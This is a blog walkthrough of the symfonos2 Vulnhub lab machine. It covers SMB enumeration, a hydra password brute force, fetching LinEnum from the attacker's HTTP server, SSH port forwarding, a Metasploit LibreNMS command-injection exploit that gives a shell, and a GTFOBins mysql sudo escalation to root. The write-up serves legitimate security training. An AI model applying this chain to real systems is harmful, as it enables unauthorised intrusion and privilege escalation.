<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the second box in the series.
Reconnaissance & Scanning After importing into VMware Workstation and booting up the machine, I was presented with the IP address of the host.
This can also be discovered running netdiscover -i eth0 as shown below:
Now that we have the IP address of the host, we can run nmap to find what services are running on the machine."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="symfonos2 - Vulnhub Boot2Root"><meta name=twitter:description content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the second box in the series.
Reconnaissance & Scanning After importing into VMware Workstation and booting up the machine, I was presented with the IP address of the host.
This can also be discovered running netdiscover -i eth0 as shown below:
Now that we have the IP address of the host, we can run nmap to find what services are running on the machine."><meta property="og:title" content="symfonos2 - Vulnhub Boot2Root"><meta property="og:description" content="Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the second box in the series.
Reconnaissance & Scanning After importing into VMware Workstation and booting up the machine, I was presented with the IP address of the host.
This can also be discovered running netdiscover -i eth0 as shown below:
Now that we have the IP address of the host, we can run nmap to find what services are running on the machine."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-06-28-symfonos2-walkthrough/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-06-28T00:00:00+00:00"><meta property="article:modified_time" content="2020-06-28T00:00:00+00:00"><title>symfonos2 - Vulnhub Boot2Root · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-06-28-symfonos2-walkthrough/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.216fdd344aee259067eaade5e8108697c18f6d1e6d5d9ec7e1269f4cf0d39d56.css integrity="sha256-IW/dNEruJZBn6q3l6BCGl8GPbR5tXZ7H4SafTPDTnVY=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.112.7"></head><body class="preload-transitions colorscheme-light"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-06-28-symfonos2-walkthrough/>symfonos2 - Vulnhub Boot2Root</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-06-28T00:00:00Z>June 28, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/vulnhub/>vulnhub</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/symfonos/>symfonos</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/symfonos2/>symfonos2</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/boot2root/>Boot2Root</a></span></div></div></header><div><p>Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the second box in the series.</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning
<a class=heading-link href=#reconnaissance--scanning><i class="fa fa-link" aria-hidden=true></i></a></h2><p>After importing into VMware Workstation and booting up the machine, I was presented with the IP address of the host.</p><p><img src=/assets/img/symfonos2-1.png alt="symfonos2 ip address"></p><p>This can also be discovered running <code>netdiscover -i eth0</code> as shown below:</p><p><img src=/assets/img/symfonos2-2.png alt="symfonos2 netdiscover"></p><p>Now that we have the IP address of the host, we can run <strong>nmap</strong> to find what services are running on the machine.</p><p><img src=/assets/img/symfonos2-3.png alt="symfonos2 nmap"></p><p>As you can see, FTP, SSH, HTTP, and SMB are running on this target host. It also appears that anonymous SMB authentication is allowed. We will first enumerate the shares with <strong>nmap&rsquo;s smb-enum-shares</strong> script as shown below.</p><p><img src=/assets/img/symfonos2-4.png alt="symfonos2 nmap smb-enum-shares"></p><p>It appears that the anonymous user has access to a few shares, let&rsquo;s connect to the anonymous share with <code>smbclient \\\\192.168.68.138\\anonymous\\ -U anonymous -N</code>. We are able to successfully connect and there is a backups folder present with a <strong>log.txt</strong> file. Let&rsquo;s retrieve that file with <strong>get</strong>.</p><p><img src=/assets/img/symfonos2-5.png alt="symfonos2 smbclient pilfering"></p><p>This file contains some interesting information. It appears that the <strong>/etc/shadow</strong> file was backed up to <strong>/var/backups/shadow.bak</strong> and that anonymous FTP access is allowed.</p><p><img src=/assets/img/symfonos2-6.png alt="symfonos2 log.txt">
<img src=/assets/img/symfonos2-7.png alt="symfonos2 log.txt"></p><p>Let&rsquo;s try to connect to the ftp servers as both anonymous and ftp. While these work, it appears that it is looking for a specific email address as a password which we have yet to uncover. Based on research, it appears that this occurs when anonymous FTP isn&rsquo;t configured properly.</p><p><img src=/assets/img/symfonos2-8.png alt="symfonos2 ftp attempt"></p><p>Reviewing the log file a bit further we come across a user account <strong>aeolus</strong>.</p><p><img src=/assets/img/symfonos2-9.png alt="symfonos2 log.txt"></p><p>At this point, I decided to run hydra to see if it was able to recover the password for this user. I elected to attack ftp as we know the aeolus user is running this service so you should be able to login with his credentials once uncovered.</p><p>After several minutes, we uncovered the password for <strong>aeolus</strong> which is <strong>sergioteamo</strong>.</p><p><img src=/assets/img/symfonos2-10.png alt="symfonos2 aeolus password"></p><p>We were able to successfully authenticate with these credentials via <strong>ssh</strong>.</p><p><img src=/assets/img/symfonos2-11.png alt="symfonos2 aeolus password"></p><p>Let&rsquo;s do some enumeration. In order to enumerate, let&rsquo;s server up an http server and use <strong>wget</strong> to download Linenum.sh to our victim&rsquo;s computer. The server can be spun up by running <code>python -m SimpleHTTPServer</code> and then can be retrieved on the victim&rsquo;s pc with <code>wget http://192.168.68.135:8000/Linenum.sh</code></p><p><img src=/assets/img/symfonos2-12.png alt="symfonos2 python http server">
<img src=/assets/img/symfonos2-13.png alt="symfonos2 wget"></p><p>Next, we have to make the script executable, which can be done with <code>chmod 777 LinEnum.sh</code></p><p><img src=/assets/img/symfonos2-14.png alt="symfonos2 wget"></p><p>Next, we run LinEnum with the thorough option and with the apache keyword option (as we know this was running from the nmap scan) with <code>./LinEnum.sh -t -k apache</code>.</p><p>After review, we see that Apache&rsquo;s configuration file is in it&rsquo;s default location of <strong>/etc/apache2/apache2.conf</strong></p><p><img src=/assets/img/symfonos2-15.png alt="symfonos2 wget"></p><p>Reviewing the Apache configuration file didn&rsquo;t show anything useful, but under the <strong>sites-enabled</strong> folder is another configuration file <strong>librenms.conf</strong>. This appears to be running on localhost only over port 8080 as shown below.</p><p><img src=/assets/img/symfonos2-16.png alt="symfonos2 librenms"></p><p>I wasn&rsquo;t sure what LibreNMS was as I hadn&rsquo;t heard of it, but let&rsquo;s search MetaSploit with ``searchsploit librenms` and see if anything shows up that can be used.</p><p><img src=/assets/img/symfonos2-17.png alt="symfonos2 searchsploit"></p><p>It appears that there are several potential exploits available. However, it appears that LibreNMS is only accessible from localhost. Let&rsquo;s do local SSH port forwarding with <code>ssh -L 8080:localhost:8080 aeolus@192.168.68.138</code>. This is one of several tricks related to port forwarding I learned from the SANS GPEN course recently.</p><p><img src=/assets/img/symfonos2-18.png alt="symfonos2 ssh local port forwarding"></p><p>Now we should be able to view this site from a web browser at http://127.0.0.1:8080/</p><p><img src=/assets/img/symfonos2-19.png alt="symfonos2 librenms login"></p><p>Let&rsquo;s try logging in with <strong>aeolus</strong> credentials we uncovered earlier.</p><p><img src=/assets/img/symfonos2-20.png alt="symfonos2 librenms login"></p><p>Success, we were able to login. Let&rsquo;s see if we can exploit this further with Metasploit. Launch Metasploit with the <code>msfconsole</code> command and use the <code>exploit/linux/http/librenms_addhost_cmd_inject</code> exploit with the options shown below:</p><p><img src=/assets/img/symfonos2-21.png alt="symfonos2 msfconsole librenms exploit"></p><p>Please note, the <strong>LHOST</strong> is the IP address of your attacker computer. Once reviewed with <code>show options</code> type in <code>run</code> and press enter.</p><p>You should now have a new shell to the victim host.</p><p><img src=/assets/img/symfonos2-22.png alt="symfonos2 msfconsole shell"></p><p>Run <code>python -c 'import pty;pty.spawn("/bin/bash")'</code> to get an interactive shell. You will see we&rsquo;re logged in as the <strong>cronos</strong> user as well.</p><p><img src=/assets/img/symfonos2-23.png alt="symfonos2 interactive shell"></p><p>Let&rsquo;s run <code>sudo -l</code> and see if <strong>cronos</strong> has access to run any programs as root.</p><p><img src=/assets/img/symfonos2-24.png alt="symfonos2 sudo -l"></p><p>Awesome, you can run mysql as root without a password, let&rsquo;s take a look at <a href=%22https://gtfobins.github.io/%22>GTFOBins</a> and see if there&rsquo;s an exploit that can be used to escalate privileges.</p><p>There is a one liner that can be ran <code>sudo mysql -e '\! /bin/sh'</code> that should result in root access.</p><p><img src=/assets/img/symfonos2-25.png alt="symfonos2 GTFOBins"></p><p>Let&rsquo;s run it and see what happens.</p><p><img src=/assets/img/symfonos2-26.png alt="symfonos2 root shell"></p><p>It worked! Now you just have to navigate to the root home directory and <code>cat proof.txt</code></p><p><img src=/assets/img/symfonos2-27.png alt="symfonos2 root proof.txt"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>